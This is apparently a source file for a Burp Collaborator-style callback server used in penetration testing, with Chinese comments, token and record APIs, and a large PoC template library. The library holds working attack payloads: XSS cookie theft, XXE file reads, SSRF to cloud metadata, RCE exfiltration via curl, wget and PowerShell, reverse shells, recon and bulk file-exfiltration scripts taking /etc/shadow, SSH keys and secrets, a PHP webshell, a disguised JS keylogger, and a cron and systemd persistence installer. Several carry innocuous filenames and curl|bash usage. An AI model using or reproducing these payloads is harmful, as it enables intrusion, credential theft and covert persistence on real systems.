"""回调服务器 API - 类似 Burp Collaborator"""
from fastapi import APIRouter, Request, Depends, HTTPException
from fastapi.responses import PlainTextResponse, Response
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from typing import Optional, List
from datetime import datetime
import asyncio
import re

from ...database import get_db
from ...models.callback import CallbackToken, CallbackRecord
from ...models.poc_rule import PocRule
from ...api.deps import get_current_user
from ...models import User
from ...schemas.callback import (
    TokenCreate, TokenRenew, TokenResponse,
    RecordResponse, PocRuleCreate, PocRuleUpdate, PocRuleResponse,
)
from ...services.callback_service import (
    get_callback_url,
    create_token as svc_create_token,
    list_tokens as svc_list_tokens,
    get_user_token,
    delete_token as svc_delete_token,
    renew_token as svc_renew_token,
    get_records as svc_get_records,
    clear_records as svc_clear_records,
    poll_records as svc_poll_records,
    get_token_stats as svc_get_token_stats,
    get_all_stats as svc_get_all_stats,
    create_poc_rule as svc_create_poc_rule,
    list_poc_rules as svc_list_poc_rules,
    update_poc_rule as svc_update_poc_rule,
    delete_poc_rule as svc_delete_poc_rule,
)

router = APIRouter()


# ==================== Token 管理 API ====================

@router.post("/tokens", response_model=TokenResponse)
async def create_token(
    req: TokenCreate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """创建新的回调 Token"""
    return await svc_create_token(db, current_user.id, req)


@router.get("/tokens", response_model=List[TokenResponse])
async def list_tokens(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取当前用户的所有 Token"""
    return await svc_list_tokens(db, current_user.id)


@router.delete("/tokens/{token_id}")
async def delete_token(
    token_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """删除 Token 及其所有记录"""
    if not await svc_delete_token(db, token_id, current_user.id):
        raise HTTPException(status_code=404, detail="Token not found")
    return {"message": "Token deleted"}


@router.patch("/tokens/{token_id}/renew", response_model=TokenResponse)
async def renew_token(
    token_id: str,
    req: TokenRenew,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """续期 Token"""
    result = await svc_renew_token(db, token_id, current_user.id, req)
    if not result:
        raise HTTPException(status_code=404, detail="Token not found")
    return result


# ==================== 统计分析 API ====================

@router.get("/tokens/{token_id}/stats")
async def get_token_stats(
    token_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取 Token 的统计信息"""
    token = await get_user_token(db, token_id, current_user.id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    return await svc_get_token_stats(db, token_id)


@router.get("/stats/all")
async def get_all_stats(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取用户所有 Token 的汇总统计"""
    return await svc_get_all_stats(db, current_user.id)


# ==================== 记录查询 API ====================

@router.get("/tokens/{token_id}/records", response_model=List[RecordResponse])
async def get_records(
    token_id: str,
    limit: int = 100,
    keyword: Optional[str] = None,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取 Token 的回调记录，支持关键字搜索"""
    token = await get_user_token(db, token_id, current_user.id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    return await svc_get_records(db, token_id, limit, keyword=keyword)


@router.delete("/tokens/{token_id}/records")
async def clear_records(
    token_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """清空 Token 的所有记录"""
    token = await get_user_token(db, token_id, current_user.id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    deleted = await svc_clear_records(db, token_id)
    return {"deleted": deleted}


@router.get("/tokens/{token_id}/poll")
async def poll_records(
    token_id: str,
    since: Optional[str] = None,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """轮询新记录"""
    token = await get_user_token(db, token_id, current_user.id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    records = await svc_poll_records(db, token_id, since)
    return {"count": len(records), "records": records}


# ==================== PoC 规则 API ====================

# PoC 模板库
POC_TEMPLATES = {
    "xss_basic": {
        "name": "xss-alert",
        "description": "基础 XSS 弹窗测试（仅验证执行）",
        "category": "xss",
        "content_type": "text/html",
        "response_body": "<script>alert(document.domain)</script>",
    },
    "xss_cookie": {
        "name": "xss-cookie",
        "description": "XSS Cookie 外带（验证+数据回传）",
        "category": "xss",
        "content_type": "text/html",
        "response_body": "<script>new Image().src='{{callback_url}}?_exfil=1&_type=cookie&_data='+encodeURIComponent(document.cookie)+'&domain='+document.domain</script>",
        "enable_variables": True,
    },
    "xss_dom": {
        "name": "xss-dom",
        "description": "XSS DOM 信息外带",
        "category": "xss",
        "content_type": "text/html",
        "response_body": "<script>fetch('{{callback_url}}?_exfil=1&_type=dom&_data='+encodeURIComponent(JSON.stringify({url:location.href,cookie:document.cookie,localStorage:Object.keys(localStorage)})))</script>",
        "enable_variables": True,
    },
    "xxe_dtd": {
        "name": "xxe-dtd",
        "description": "XXE 外带 DTD（文件内容回传）",
        "category": "xxe",
        "content_type": "application/xml-dtd",
        "response_body": "<!ENTITY % data SYSTEM \"file:///etc/passwd\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM '{{callback_url}}?_exfil=1&_type=file&_data=%data;'>\">\n%param1;",
        "enable_variables": True,
    },
    "xxe_file": {
        "name": "xxe-file",
        "description": "XXE 文件读取（内联）",
        "category": "xxe",
        "content_type": "application/xml",
        "response_body": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>",
    },
    "ssrf_aws": {
        "name": "ssrf-aws",
        "description": "SSRF AWS Metadata 重定向",
        "category": "ssrf",
        "redirect_url": "http://169.254.169.254/latest/meta-data/",
        "status_code": 302,
    },
    "ssrf_gcp": {
        "name": "ssrf-gcp",
        "description": "SSRF GCP Metadata 重定向",
        "category": "ssrf",
        "redirect_url": "http://metadata.google.internal/computeMetadata/v1/",
        "status_code": 302,
    },
    "ssrf_exfil": {
        "name": "ssrf-exfil",
        "description": "SSRF 数据外带（curl）",
        "category": "ssrf",
        "content_type": "text/plain",
        "response_body": "curl '{{callback_url}}?_exfil=1&_type=ssrf&_data='$(cat /etc/passwd | base64 -w0)",
        "enable_variables": True,
    },
    "rce_curl": {
        "name": "rce-curl",
        "description": "RCE 命令结果外带（curl）",
        "category": "rce",
        "content_type": "text/plain",
        "response_body": "curl '{{callback_url}}?_exfil=1&_type=cmd&_data='$(id | base64 -w0)",
        "enable_variables": True,
    },
    "rce_wget": {
        "name": "rce-wget",
        "description": "RCE 命令结果外带（wget）",
        "category": "rce",
        "content_type": "text/plain",
        "response_body": "wget -q -O- '{{callback_url}}?_exfil=1&_type=cmd&_data='$(whoami)",
        "enable_variables": True,
    },
    "rce_powershell": {
        "name": "rce-ps",
        "description": "RCE PowerShell 外带",
        "category": "rce",
        "content_type": "text/plain",
        "response_body": "powershell -c \"IWR '{{callback_url}}?_exfil=1&_type=cmd&_data='+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))\"",
        "enable_variables": True,
    },
    "ssti_jinja": {
        "name": "ssti-jinja",
        "description": "SSTI Jinja2 RCE 外带",
        "category": "rce",
        "content_type": "text/plain",
        "response_body": "{{config.__class__.__init__.__globals__['os'].popen('curl \"{{callback_url}}?_exfil=1&_type=ssti&_data=\"$(id)').read()}}",
        "enable_variables": True,
    },
    "shell_bash": {
        "name": "shell-bash",
        "description": "Bash 反弹 Shell",
        "category": "shell",
        "content_type": "text/plain",
        "response_body": "bash -i >& /dev/tcp/{{attacker_ip}}/{{attacker_port}} 0>&1",
        "enable_variables": True,
    },
    "shell_python": {
        "name": "shell-python",
        "description": "Python 反弹 Shell",
        "category": "shell",
        "content_type": "text/plain",
        "response_body": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{attacker_ip}}\",{{attacker_port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "enable_variables": True,
    },
    "script_bash_recon": {
        "name": "recon-linux",
        "description": "Linux 系统信息收集脚本（curl | bash）",
        "category": "script",
        "content_type": "text/plain",
        "filename": "setup.sh",
        "usage": "curl -sL {url} | bash",
        "response_body": """#!/bin/bash
CB="{{callback_url}}"
c(){ echo "=== $1 ==="; eval "$2" 2>/dev/null; echo; }
{
  c "System" "uname -a; cat /etc/os-release"
  c "User" "whoami; id; w"
  c "Network" "ip a || ifconfig; ss -tlnp || netstat -tlnp"
  c "DNS" "cat /etc/resolv.conf; cat /etc/hosts"
  c "Passwd" "cat /etc/passwd"
  c "Shadow" "cat /etc/shadow"
  c "SSH Keys" "ls -la ~/.ssh/; cat ~/.ssh/authorized_keys; cat ~/.ssh/id_rsa"
  c "Cron" "crontab -l; ls -la /etc/cron*"
  c "SUID" "find / -perm -4000 -type f 2>/dev/null | head -20"
  c "Process" "ps aux | head -40"
  c "Env" "env"
  c "History" "cat ~/.bash_history | tail -50"
  c "Docker" "docker ps; cat /proc/1/cgroup"
  c "K8s" "cat /var/run/secrets/kubernetes.io/serviceaccount/token; env | grep -i kube"
} | curl -s -X POST "$CB?_exfil=1&_type=recon" -d @-""",
        "enable_variables": True,
    },
    "script_py_recon": {
        "name": "recon-python",
        "description": "跨平台 Python 信息收集脚本",
        "category": "script",
        "content_type": "text/plain",
        "filename": "check.py",
        "usage": "curl -sL {url} | python3",
        "response_body": """#!/usr/bin/env python3
import os,sys,socket,platform,json,urllib.request,subprocess as sp
CB="{{callback_url}}"
def run(cmd):
    try: return sp.check_output(cmd,shell=True,stderr=sp.DEVNULL,timeout=10).decode(errors='replace')
    except: return ""
info={}
info["hostname"]=socket.gethostname()
info["platform"]=platform.platform()
info["arch"]=platform.machine()
info["user"]=os.getenv("USER") or os.getenv("USERNAME") or run("whoami").strip()
info["uid"]=run("id").strip()
info["cwd"]=os.getcwd()
info["pid"]=os.getpid()
info["python"]=sys.version
info["ip_internal"]=socket.gethostbyname(socket.gethostname())
info["env"]={k:v for k,v in os.environ.items() if any(x in k.upper() for x in ["KEY","SECRET","TOKEN","PASS","AWS","DB","API"])}
info["ifconfig"]=run("ip a 2>/dev/null || ifconfig 2>/dev/null")
info["passwd"]=run("cat /etc/passwd 2>/dev/null")
info["ps"]=run("ps aux 2>/dev/null | head -30")
info["home_files"]=run("ls -la ~ 2>/dev/null")
info["ssh_keys"]=run("ls -la ~/.ssh/ 2>/dev/null")
data=json.dumps(info,ensure_ascii=False,indent=2).encode()
req=urllib.request.Request(CB+"?_exfil=1&_type=recon",data=data,method="POST")
req.add_header("Content-Type","application/json")
try: urllib.request.urlopen(req,timeout=15)
except: pass""",
        "enable_variables": True,
    },
    "script_ps_recon": {
        "name": "recon-windows",
        "description": "Windows PowerShell 信息收集脚本",
        "category": "script",
        "content_type": "text/plain",
        "filename": "update.ps1",
        "usage": "powershell -ep bypass -c \"IEX(IWR '{url}')\"",
        "response_body": """$CB="{{callback_url}}"
$info=@{}
$info["hostname"]=$env:COMPUTERNAME
$info["user"]="$env:USERDOMAIN\\$env:USERNAME"
$info["os"]=(Get-CimInstance Win32_OperatingSystem).Caption
$info["arch"]=$env:PROCESSOR_ARCHITECTURE
$info["ip"]=(Get-NetIPAddress -AddressFamily IPv4 | Where {$_.IPAddress -ne "127.0.0.1"}).IPAddress -join ","
$info["domain"]=(Get-CimInstance Win32_ComputerSystem).Domain
$info["av"]=(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA 0).displayName -join ","
$info["ps"]=(Get-Process | Select -First 30 Name,Id,Path | ConvertTo-Json -Compress)
$info["services"]=(Get-Service | Where Status -eq Running | Select -First 20 Name | ConvertTo-Json -Compress)
$info["env"]=($env:Path)
$info["admins"]=(net localgroup administrators 2>$null) -join "`n"
$info["netstat"]=(netstat -an | Select -First 30) -join "`n"
$info["arp"]=(arp -a) -join "`n"
$info["installed"]=((Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*).DisplayName | Select -First 20) -join ","
$json=[System.Text.Encoding]::UTF8.GetBytes(($info|ConvertTo-Json -Compress))
try{IWR -Uri "$CB`?_exfil=1&_type=recon" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 15}catch{}""",
        "enable_variables": True,
    },
    "script_bash_exfil": {
        "name": "exfil-files",
        "description": "批量文件外带脚本（支持指定目录）",
        "category": "script",
        "content_type": "text/plain",
        "filename": "check.sh",
        "usage": "curl -sL {url} | bash",
        "response_body": """#!/bin/bash
CB="{{callback_url}}"
TARGETS="/etc/passwd /etc/shadow /etc/hosts /etc/crontab"
TARGETS="$TARGETS $(find /home -name '.bash_history' -o -name '.env' -o -name 'id_rsa' -o -name '*.conf' 2>/dev/null | head -20)"
TARGETS="$TARGETS $(find /var/www -name '*.php' -o -name '*.env' -o -name 'config*' 2>/dev/null | head -20)"
TARGETS="$TARGETS $(find /opt /srv -name '*.yml' -o -name '*.yaml' -o -name '*.json' -o -name '.env' 2>/dev/null | head -20)"
for f in $TARGETS; do
  [ -r "$f" ] && {
    data=$(base64 -w0 "$f" 2>/dev/null || base64 "$f" 2>/dev/null)
    curl -s "$CB?_exfil=1&_type=file&filename=$(echo $f|base64 -w0)&_data=$data" -o /dev/null
    sleep 0.2
  }
done""",
        "enable_variables": True,
    },
    "script_py_revshell": {
        "name": "revshell-python",
        "description": "Python 反弹 Shell 脚本（带 PTY）",
        "category": "script",
        "content_type": "text/plain",
        "filename": "svc.py",
        "usage": "curl -sL {url} | python3",
        "response_body": """#!/usr/bin/env python3
import socket,subprocess,os,pty,sys
HOST="{{attacker_ip}}"
PORT={{attacker_port}}
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,int(PORT)))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
except:
    sys.exit(0)""",
        "enable_variables": True,
    },
    "script_php_webshell": {
        "name": "webshell-php",
        "description": "PHP 一句话 Webshell（密码保护）",
        "category": "script",
        "content_type": "application/x-httpd-php",
        "filename": "config.php",
        "response_body": "<?php if(md5($_GET['k'])!=='{{param.keyhash}}'){die('404');}@eval($_POST['cmd']);?>\n<?php /* Usage: ?k=yourkey POST cmd=phpinfo(); */ ?>",
        "enable_variables": True,
    },
    "script_js_keylogger": {
        "name": "keylogger-js",
        "description": "JavaScript 键盘记录器脚本",
        "category": "script",
        "content_type": "text/javascript",
        "filename": "analytics.js",
        "usage": "<script src=\"{url}\"></script>",
        "response_body": """(function(){var b="",u="{{callback_url}}";document.addEventListener("keypress",function(e){b+=e.key;if(b.length>=20){new Image().src=u+"?_exfil=1&_type=keylog&_data="+encodeURIComponent(b)+"&page="+encodeURIComponent(location.href);b=""}});document.addEventListener("submit",function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v});new Image().src=u+"?_exfil=1&_type=form&_data="+encodeURIComponent(JSON.stringify(d))})})();""",
        "enable_variables": True,
    },
    "script_bash_persist": {
        "name": "persist-cron",
        "description": "Linux Cron 持久化脚本",
        "category": "script",
        "content_type": "text/plain",
        "filename": "install.sh",
        "usage": "curl -sL {url} | bash",
        "response_body": """#!/bin/bash
CB="{{callback_url}}"
PAYLOAD="curl -s $CB?_exfil=1&_type=beacon&_data=$(hostname)-$(whoami) > /dev/null 2>&1"
# cron 持久化
(crontab -l 2>/dev/null; echo "*/5 * * * * $PAYLOAD") | sort -u | crontab - 2>/dev/null
# bashrc 持久化
grep -q "$CB" ~/.bashrc 2>/dev/null || echo "$PAYLOAD" >> ~/.bashrc 2>/dev/null
# systemd timer（需要 root）
if [ "$(id -u)" -eq 0 ]; then
cat > /etc/systemd/system/syscheck.service << 'SVC'
[Unit]
Description=System Check
[Service]
Type=oneshot
ExecStart=/bin/bash -c "PAYLOAD_CMD"
SVC
sed -i "s|PAYLOAD_CMD|$PAYLOAD|g" /etc/systemd/system/syscheck.service
cat > /etc/systemd/system/syscheck.timer << 'TMR'
[Unit]
Description=System Check Timer
[Timer]
OnBootSec=60
OnUnitActiveSec=300
[Install]
WantedBy=timers.target
TMR
systemctl daemon-reload && systemctl enable --now syscheck.timer 2>/dev/null
fi
$PAYLOAD""",
        "enable_variables": True,
    },
}


@router.get("/poc-templates")
async def get_poc_templates():
    """获取 PoC 模板库"""
    return {"templates": POC_TEMPLATES}


@router.post("/tokens/{token_id}/rules", response_model=PocRuleResponse)
async def create_poc_rule(
    token_id: str,
    req: PocRuleCreate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """创建 PoC 规则"""
    token = await get_user_token(db, token_id, current_user.id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    result = await svc_create_poc_rule(db, token, req)
    if not result:
        raise HTTPException(status_code=400, detail="Rule name already exists")
    return result


@router.get("/tokens/{token_id}/rules", response_model=List[PocRuleResponse])
async def list_poc_rules(
    token_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取 PoC 规则列表"""
    token = await get_user_token(db, token_id, current_user.id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    return await svc_list_poc_rules(db, token)


@router.patch("/tokens/{token_id}/rules/{rule_id}", response_model=PocRuleResponse)
async def update_poc_rule(
    token_id: str, rule_id: str, req: PocRuleUpdate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """更新 PoC 规则"""
    token = await get_user_token(db, token_id, current_user.id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    result = await svc_update_poc_rule(db, token, rule_id, req)
    if not result:
        raise HTTPException(status_code=404, detail="Rule not found")
    return result


@router.delete("/tokens/{token_id}/rules/{rule_id}")
async def delete_poc_rule(
    token_id: str, rule_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """删除 PoC 规则"""
    token = await get_user_token(db, token_id, current_user.id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    if not await svc_delete_poc_rule(db, token_id, rule_id):
        raise HTTPException(status_code=404, detail="Rule not found")
    return {"message": "Rule deleted"}


# ==================== 回调接收端点（公开，无需认证）====================

def replace_variables(content: str, request: Request, client_ip: str, token: str) -> str:
    """替换响应内容中的变量"""
    if not content:
        return content

    query_params = dict(request.query_params)
    replacements = {
        '{{client_ip}}': client_ip or 'unknown',
        '{{timestamp}}': datetime.utcnow().isoformat(),
        '{{method}}': request.method,
        '{{path}}': str(request.url.path),
        '{{host}}': request.headers.get('host', 'unknown'),
        '{{user_agent}}': request.headers.get('user-agent', 'unknown'),
        '{{callback_url}}': get_callback_url(f"/c/{token}"),
        '{{attacker_ip}}': 'ATTACKER_IP',
        '{{attacker_port}}': '4444',
    }

    for var, value in replacements.items():
        content = content.replace(var, value)

    param_pattern = r'\{\{param\.(\w+)\}\}'
    for match in re.finditer(param_pattern, content):
        param_name = match.group(1)
        param_value = query_params.get(param_name, '')
        content = content.replace(match.group(0), param_value)

    return content


def _normalize_ip(ip: str) -> str:
    if ip and ip.startswith('::ffff:'):
        return ip[7:]
    return ip or ''


def get_client_ip(request: Request) -> str:
    """从请求中获取真实客户端 IP"""
    proxy_headers = [
        'CF-Connecting-IP',
        'X-Real-IP',
        'True-Client-IP',
        'X-Client-IP',
    ]

    for header in proxy_headers:
        value = request.headers.get(header)
        if value:
            ip = value.split(',')[0].strip()
            if ip:
                return _normalize_ip(ip)

    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
        if ip:
            return _normalize_ip(ip)

    if request.client and request.client.host:
        return _normalize_ip(request.client.host)

    return 'unknown'


async def handle_callback(request: Request, token: str, path: str, db: AsyncSession):
    """处理回调请求 - 始终记录所有请求"""
    result = await db.execute(
        select(CallbackToken).where(CallbackToken.token == token)
    )
    db_token = result.scalar_one_or_none()

    if not db_token:
        return PlainTextResponse("Not Found", status_code=404)

    is_expired = db_token.expires_at and db_token.expires_at < datetime.utcnow()
    client_ip = get_client_ip(request)

    try:
        body = (await request.body()).decode('utf-8', errors='replace')
    except Exception:
        body = None

    headers_dict = dict(request.headers)

    raw_lines = [
        f"{request.method} {request.url.path}{'?' + str(request.url.query) if request.url.query else ''} HTTP/1.1",
        f"Host: {request.headers.get('host', 'unknown')}"
    ]
    for k, v in headers_dict.items():
        if k.lower() != 'host':
            raw_lines.append(f"{k}: {v}")
    raw_lines.append("")
    if body:
        raw_lines.append(body)
    raw_request = "\r\n".join(raw_lines)

    query_params = dict(request.query_params)
    is_data_exfil = query_params.get('_exfil') == '1'
    exfil_type = query_params.get('_type') if is_data_exfil else None
    exfil_data = query_params.get('_data') if is_data_exfil else None

    if is_data_exfil and not exfil_data:
        for key in ['data', 'd', 'c', 'cookie', 'file', 'cmd', 'result']:
            if key in query_params:
                exfil_data = query_params[key]
                break
        if not exfil_data and body:
            exfil_data = body[:2000]

    is_poc_hit = path.startswith("p/")
    poc_rule_name = path[2:].split("/")[0] if is_poc_hit else None

    record = CallbackRecord(
        token_id=db_token.id, token=token,
        client_ip=client_ip, method=request.method,
        path=f"/{path}" if path else "/",
        query_string=str(request.url.query) if request.url.query else None,
        headers=headers_dict, body=body if body else None,
        user_agent=request.headers.get("user-agent"),
        protocol="HTTP", raw_request=raw_request,
        is_poc_hit=1 if is_poc_hit else 0,
        poc_rule_name=poc_rule_name,
        is_data_exfil=1 if is_data_exfil else 0,
        exfil_data=exfil_data, exfil_type=exfil_type,
    )
    db.add(record)
    await db.flush()

    if path.startswith("p/"):
        rule_name = path[2:].split("/")[0]
        rule_result = await db.execute(
            select(PocRule).where(
                PocRule.token_id == db_token.id,
                PocRule.name == rule_name,
                PocRule.is_active == 1
            )
        )
        rule = rule_result.scalar_one_or_none()

        if rule:
            rule.hit_count += 1
            await db.flush()

            if rule.delay_ms > 0:
                await asyncio.sleep(rule.delay_ms / 1000)

            if rule.redirect_url:
                redirect_url = rule.redirect_url
                if rule.enable_variables:
                    redirect_url = replace_variables(redirect_url, request, client_ip, token)
                return Response(
                    content="",
                    status_code=rule.status_code or 302,
                    headers={"Location": redirect_url}
                )

            response_body = rule.response_body or ""
            if rule.enable_variables:
                response_body = replace_variables(response_body, request, client_ip, token)

            response_headers = dict(rule.response_headers or {})
            response_headers["Content-Type"] = rule.content_type
            if rule.filename:
                response_headers["Content-Disposition"] = f'inline; filename="{rule.filename}"'

            return Response(
                content=response_body,
                status_code=rule.status_code,
                headers=response_headers
            )
        else:
            return PlainTextResponse(f"PoC Rule '{rule_name}' not found", status_code=404)

    if is_expired:
        return PlainTextResponse("Token Expired (but recorded)", status_code=410)
    return PlainTextResponse("OK", status_code=200)
